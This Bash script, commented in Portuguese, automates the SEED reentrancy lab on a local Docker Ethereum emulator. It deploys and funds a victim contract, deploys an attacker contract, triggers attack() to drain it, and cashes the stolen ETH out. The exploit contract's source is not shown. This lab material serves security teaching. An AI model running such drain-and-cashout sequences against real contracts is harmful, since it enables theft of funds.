#!/usr/bin/env bash
# seed_automate.sh - Automatiza o lab Blockchain Reentrancy Attack
# Execução: ./seed_automate.sh
set -euo pipefail
IFS=$'\n\t'

# --- Cores ---
VERDE='\033[0;32m'
AZUL='\033[0;34m'
CIANO='\033[0;36m'
AMARELO='\033[1;33m'
VERMELHO='\033[0;31m'
ROXO='\033[0;35m'
NEGRITO='\033[1m'
SC='\033[0m'

# --- Configuração ---
RAIZ_LAB="$(pwd)"
DIR_EMULADOR="$RAIZ_LAB/emulator_10"
DIR_CONTRATO="$RAIZ_LAB/contract"
DIR_VITIMA="$RAIZ_LAB/victim"
DIR_ATACANTE="$RAIZ_LAB/attacker"
FICHEIRO_COMPOSE="$DIR_EMULADOR/docker-compose.yml"

# Endpoints RPC (tentar ambos)
RPC_NODE_PRIMARIO="http://10.150.0.71:8545"
RPC_NODE_SECUNDARIO="http://10.151.0.71:8545"
RPC_NODE=""

ESPERA_MAXIMA=300
INTERVALO_TENTATIVA=5

# --- Funções Auxiliares ---
log() { echo -e "${VERDE}[+]${SC} $*"; }
erro() { echo -e "${VERMELHO}[!]${SC} $*" >&2; }
info() { echo -e "${CIANO}[i]${SC} $*"; }
passo() { echo -e "${ROXO}${NEGRITO}[*] $*${SC}"; }
sucesso() { echo -e "${VERDE}${NEGRITO}[SUCESSO] $*${SC}"; }

# --- Verificações iniciais ---
passo "FASE 0: Verificações Iniciais"

# Verificar dependências
for cmd in docker docker-compose python3 pip3; do
  if ! command -v $cmd >/dev/null 2>&1; then
    erro "Dependência em falta: $cmd"
    exit 1
  fi
done
log "Todas as dependências encontradas"

# Verificar biblioteca web3
if ! python3 -c "import web3" 2>/dev/null; then
    log "web3 não encontrado, a instalar web3==5.31.1..."
    pip3 install web3==5.31.1 --quiet
    if ! python3 -c "import web3" 2>/dev/null; then
        erro "Falha ao instalar web3"
        exit 1
    fi
    log "web3==5.31.1 instalado"
else
    log "web3 já instalado"
fi

# Verificar directório do emulador
if [ ! -d "$DIR_EMULADOR" ]; then
    erro "ERRO: Pasta $DIR_EMULADOR não encontrada!"
    erro "Certifica-te que estás na raiz do Labsetup-BlockChain"
    exit 1
fi
log "Directório do emulador encontrado"

# Verificar docker-compose.yml
if [ ! -f "$FICHEIRO_COMPOSE" ]; then
    erro "ERRO: $FICHEIRO_COMPOSE não encontrado!"
    exit 1
fi
log "docker-compose.yml encontrado"

# Criar directórios necessários
mkdir -p "$DIR_CONTRATO" "$DIR_VITIMA" "$DIR_ATACANTE"
log "Directórios criados/verificados"

echo ""
passo "FASE 1: Levantar Emulador Ethereum"

# Parar containers anteriores
log "A parar containers antigos..."
cd "$DIR_EMULADOR"
docker-compose down 2>/dev/null || true
sleep 2

# Definir timeout
export COMPOSE_HTTP_TIMEOUT=300

# Iniciar containers
log "A iniciar emulador (isto pode demorar 1-2 minutos)..."
docker-compose up -d

log "A aguardar que os containers iniciem..."
sleep 10

# Encontrar containers Ethereum
log "A procurar containers Ethereum..."
CONTAINERS_GETH=$(docker ps --format "{{.Names}}" | grep -E "(Ethereum|POA|Signer|BootNode|hnode|geth)" || true)

if [ -z "$CONTAINERS_GETH" ]; then
    erro "ERRO: Nenhum container Ethereum encontrado!"
    erro "Containers disponíveis:"
    docker ps --format "{{.Names}}"
    exit 1
fi

log "Containers Ethereum encontrados:"
echo "$CONTAINERS_GETH" | while read container; do
    echo "  - $container"
done

# Aguardar que o geth fique pronto
log "A aguardar que o geth inicie (timeout: ${ESPERA_MAXIMA}s)..."
DECORRIDO=0
GETH_PRONTO=0

while [ $DECORRIDO -lt $ESPERA_MAXIMA ]; do
    # Verificar logs para HTTP endpoint
    for container in $CONTAINERS_GETH; do
        if docker logs "$container" 2>&1 | grep -q "HTTP endpoint opened"; then
            log "HTTP endpoint detectado em $container"
            GETH_PRONTO=1
            break 2
        fi
    done
    
    # Tentar conectar via RPC
    if curl -s -X POST -H "Content-Type: application/json" \
        --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
        "$RPC_NODE_PRIMARIO" 2>/dev/null | grep -q "result"; then
        RPC_NODE="$RPC_NODE_PRIMARIO"
        log "RPC respondeu em $RPC_NODE_PRIMARIO"
        GETH_PRONTO=1
        break
    fi
    
    if curl -s -X POST -H "Content-Type: application/json" \
        --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
        "$RPC_NODE_SECUNDARIO" 2>/dev/null | grep -q "result"; then
        RPC_NODE="$RPC_NODE_SECUNDARIO"
        log "RPC respondeu em $RPC_NODE_SECUNDARIO"
        GETH_PRONTO=1
        break
    fi
    
    printf "."
    sleep $INTERVALO_TENTATIVA
    DECORRIDO=$((DECORRIDO + INTERVALO_TENTATIVA))
done

echo ""

if [ $GETH_PRONTO -eq 0 ]; then
    erro "TIMEOUT: Geth não ficou pronto em ${ESPERA_MAXIMA}s"
    erro "Últimas 50 linhas dos logs:"
    for container in $CONTAINERS_GETH; do
        echo "=== $container ==="
        docker logs --tail 50 "$container" 2>&1
    done
    exit 1
fi

sucesso "Emulador Ethereum pronto!"

# Guardar RPC_NODE em ficheiro
echo "RPC_NODE=$RPC_NODE" > "$RAIZ_LAB/RPC_NODE.env"
log "URL RPC guardado em RPC_NODE.env"

echo ""
passo "FASE 2: Compilar Contratos"

cd "$DIR_CONTRATO"

# Verificar compilador solc
if [ ! -f "./solc-0.6.8" ]; then
    erro "ERRO: solc-0.6.8 não encontrado em $DIR_CONTRATO"
    erro "Por favor, coloca o compilador solc-0.6.8 nesta pasta"
    exit 1
fi
chmod +x ./solc-0.6.8

# Compilar contrato Vítima
log "A compilar ReentrancyVictim.sol..."
./solc-0.6.8 --overwrite --abi --bin -o . ReentrancyVictim.sol 2>/dev/null
if [ ! -f "ReentrancyVictim.abi" ] || [ ! -f "ReentrancyVictim.bin" ]; then
    erro "Falha ao compilar ReentrancyVictim"
    exit 1
fi
log "ReentrancyVictim compilado"

# Compilar contrato Atacante
log "A compilar ReentrancyAttacker.sol..."
./solc-0.6.8 --overwrite --abi --bin -o . ReentrancyAttacker.sol 2>/dev/null
if [ ! -f "ReentrancyAttacker.abi" ] || [ ! -f "ReentrancyAttacker.bin" ]; then
    erro "Falha ao compilar ReentrancyAttacker"
    exit 1
fi
log "ReentrancyAttacker compilado"

sucesso "Contratos compilados com sucesso!"

echo ""
passo "FASE 3: Deploy do Contrato Vítima"

cd "$DIR_VITIMA"

# Criar script Python de deployment
cat > deploy_victim.py <<'PYEOF'
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *

abi_file = "../contract/ReentrancyVictim.abi"
bin_file = "../contract/ReentrancyVictim.bin"

node_rpc = os.getenv('RPC_NODE', 'http://10.150.0.71:8545')
print(f"[deploy] A conectar a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    print(f"[deploy] Conectado. Número de bloco: {web3.eth.block_number}", flush=True)
    
    sender_account = web3.eth.accounts[1]
    print(f"[deploy] A usar conta: {sender_account}", flush=True)
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    print("[deploy] Conta desbloqueada", flush=True)
    
    addr = SEEDWeb3.deploy_contract(web3, sender_account, abi_file, bin_file, None)
    print(f"[deploy] Contrato Victim deployed: {addr}", flush=True)
    
    with open("contract_address_victim.txt", "w") as fd:
        fd.write(addr)
    
    print("[deploy] Endereço guardado em contract_address_victim.txt", flush=True)
except Exception as e:
    print(f"[deploy] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x deploy_victim.py

# Deploy do contrato vítima
log "A fazer deploy do contrato vítima..."
export RPC_NODE
python3 deploy_victim.py

if [ ! -f "contract_address_victim.txt" ]; then
    erro "ERRO: Deploy falhou, contract_address_victim.txt não foi criado"
    exit 1
fi

ENDERECO_VITIMA=$(cat contract_address_victim.txt)
log "Contrato Victim deployed: $ENDERECO_VITIMA"

echo ""
passo "FASE 4: Financiar Contrato Vítima (30 ETH)"

# Criar script de financiamento
cat > fund_victim.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

abi_file = "../contract/ReentrancyVictim.abi"
victim_addr = '${ENDERECO_VITIMA}'

node_rpc = os.getenv('RPC_NODE', 'http://10.151.0.71:8545')
print(f"[fund] A conectar a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    sender_account = web3.eth.accounts[1]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent(abi_file)
    contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
    
    amount = 30
    print(f"[fund] A depositar {amount} ETH...", flush=True)
    tx_hash = contract.functions.deposit().transact({
        'from': sender_account,
        'value': Web3.toWei(amount, 'ether')
    })
    
    print(f"[fund] TX Hash: {tx_hash.hex()}", flush=True)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[fund] Transação confirmada no bloco {tx_receipt.blockNumber}", flush=True)
    
    balance = contract.functions.getContractBalance().call()
    print(f"[fund] Saldo do contrato: {Web3.fromWei(balance, 'ether')} ETH", flush=True)
except Exception as e:
    print(f"[fund] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x fund_victim.py
python3 fund_victim.py

sucesso "Contrato vítima financiado com 30 ETH!"

echo ""
passo "FASE 5: Testar Withdraw (5 ETH)"

# Criar script de teste de levantamento
cat > test_withdraw.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

abi_file = "../contract/ReentrancyVictim.abi"
victim_addr = '${ENDERECO_VITIMA}'

node_rpc = os.getenv('RPC_NODE', 'http://10.151.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    sender_account = web3.eth.accounts[1]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent(abi_file)
    contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
    
    amount = 5
    print(f"[withdraw] A retirar {amount} ETH...", flush=True)
    tx_hash = contract.functions.withdraw(Web3.toWei(amount, 'ether')).transact({
        'from': sender_account
    })
    
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[withdraw] Retirada confirmada", flush=True)
    
    myBalance = contract.functions.getBalance(sender_account).call()
    print(f"[withdraw] Meu saldo interno: {Web3.fromWei(myBalance, 'ether')} ETH", flush=True)
    
    contractBalance = contract.functions.getContractBalance().call()
    print(f"[withdraw] Saldo do contrato: {Web3.fromWei(contractBalance, 'ether')} ETH", flush=True)
except Exception as e:
    print(f"[withdraw] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x test_withdraw.py
python3 test_withdraw.py

sucesso "Levantamento de 5 ETH testado com sucesso!"

echo ""
passo "FASE 6: Deploy do Contrato Atacante"

cd "$DIR_ATACANTE"

# Criar script de deployment do atacante - USANDO ACCOUNT[0] EM VEZ DE [2]
cat > deploy_attacker.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *

abi_file = "../contract/ReentrancyAttacker.abi"
bin_file = "../contract/ReentrancyAttacker.bin"
victim_addr = '${ENDERECO_VITIMA}'

node_rpc = os.getenv('RPC_NODE', 'http://10.150.0.71:8545')
print(f"[deploy_attacker] A conectar a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] em vez de [2] que não existe
    sender_account = web3.eth.accounts[0]
    print(f"[deploy_attacker] A usar conta: {sender_account}", flush=True)
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    print("[deploy_attacker] Conta desbloqueada", flush=True)
    
    addr = SEEDWeb3.deploy_contract(web3, sender_account, abi_file, bin_file, [victim_addr])
    print(f"[deploy_attacker] Contrato Attacker deployed: {addr}", flush=True)
    
    with open("contract_address_attacker.txt", "w") as fd:
        fd.write(addr)
    
    print("[deploy_attacker] Endereço guardado", flush=True)
except Exception as e:
    print(f"[deploy_attacker] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x deploy_attacker.py
python3 deploy_attacker.py

if [ ! -f "contract_address_attacker.txt" ]; then
    erro "ERRO: Deploy do attacker falhou"
    exit 1
fi

ENDERECO_ATACANTE=$(cat contract_address_attacker.txt)
log "Contrato Attacker deployed: $ENDERECO_ATACANTE"

echo ""
passo "FASE 7: Verificar Saldos ANTES do Ataque"

cat > check_balances.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

victim_addr = '${ENDERECO_VITIMA}'
attacker_addr = '${ENDERECO_ATACANTE}'

node_rpc = os.getenv('RPC_NODE', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    victim_abi = SEEDWeb3.getFileContent("../contract/ReentrancyVictim.abi")
    victim_contract = web3.eth.contract(address=victim_addr, abi=victim_abi)
    
    attacker_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    attacker_contract = web3.eth.contract(address=attacker_addr, abi=attacker_abi)
    
    victim_balance = victim_contract.functions.getContractBalance().call()
    attacker_balance = attacker_contract.functions.getBalance().call()
    
    print("=" * 60)
    print(f"Contrato Vítima:   {Web3.fromWei(victim_balance, 'ether')} ETH")
    print(f"Contrato Atacante: {Web3.fromWei(attacker_balance, 'ether')} ETH")
    print("=" * 60)
except Exception as e:
    print(f"ERRO: {e}")
    sys.exit(1)
PYEOF

chmod +x check_balances.py
python3 check_balances.py

echo ""
echo -e "${AMARELO}${NEGRITO}=========================================================================="
echo "AVISO: PRONTO PARA ATACAR!"
echo -e "==========================================================================${SC}"
echo ""
echo -e "${CIANO}O ataque vai roubar TODOS os ETH do contrato vítima!${SC}"
echo ""
read -p "Pressiona ENTER para lançar o ATAQUE DE REENTRANCY..."

echo ""
passo "FASE 8: LANÇAR ATAQUE DE REENTRANCY"

cat > launch_attack.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

attacker_addr = '${ENDERECO_ATACANTE}'

node_rpc = os.getenv('RPC_NODE', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] em vez de [2]
    sender_account = web3.eth.accounts[0]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    contract = web3.eth.contract(address=attacker_addr, abi=contract_abi)
    
    print("[ATTACK] A lançar ataque de reentrancy...", flush=True)
    tx_hash = contract.functions.attack().transact({
        'from': sender_account,
        'value': Web3.toWei('1', 'ether')
    })
    
    print(f"[ATTACK] TX Hash: {tx_hash.hex()}", flush=True)
    print("[ATTACK] A aguardar confirmação...", flush=True)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    
    print(f"[ATTACK] Ataque confirmado no bloco {tx_receipt.blockNumber}", flush=True)
    print(f"[ATTACK] Gas usado: {tx_receipt.gasUsed}", flush=True)
    
except Exception as e:
    print(f"[ATTACK] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x launch_attack.py
python3 launch_attack.py

sucesso "ATAQUE EXECUTADO!"

echo ""
passo "FASE 9: Verificar Saldos DEPOIS do Ataque"

python3 check_balances.py

echo ""
passo "FASE 10: Cash Out (transferir ETH para conta do atacante)"

cat > cashout.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

attacker_addr = '${ENDERECO_ATACANTE}'

node_rpc = os.getenv('RPC_NODE', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] como sender e [1] como destino
    sender_account = web3.eth.accounts[0]
    destination = web3.eth.accounts[1]
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    contract = web3.eth.contract(address=attacker_addr, abi=contract_abi)
    
    print(f"[cashout] A transferir fundos para {destination}...", flush=True)
    tx_hash = contract.functions.cashOut(destination).transact({
        'from': sender_account
    })
    
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[cashout] Transferência confirmada", flush=True)
    
    # Verificar saldo final
    final_balance = web3.eth.get_balance(destination)
    print(f"[cashout] Saldo final de {destination}: {Web3.fromWei(final_balance, 'ether')} ETH", flush=True)
    
except Exception as e:
    print(f"[cashout] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x cashout.py
python3 cashout.py

echo ""
echo -e "${VERDE}${NEGRITO}=========================================================================="
echo "LAB CONCLUÍDO COM SUCESSO!"
echo -e "==========================================================================${SC}"
echo ""
info "Contrato Vítima:    $ENDERECO_VITIMA"
info "Contrato Atacante:  $ENDERECO_ATACANTE"
info "Endpoint RPC:       $RPC_NODE"
echo ""
info "Visualizar EtherView: http://localhost:5000/"
echo ""
info "Parar emulador: cd $DIR_EMULADOR && docker-compose down"
info "Ver logs: docker logs <nome_do_container>"
echo ""
echo -e "${AMARELO}O ataque de reentrancy roubou todos os fundos do contrato vítima!${SC}"
echo -e "${VERDE}${NEGRITO}==========================================================================${SC}"

cd "$RAIZ_LAB"
exit 0
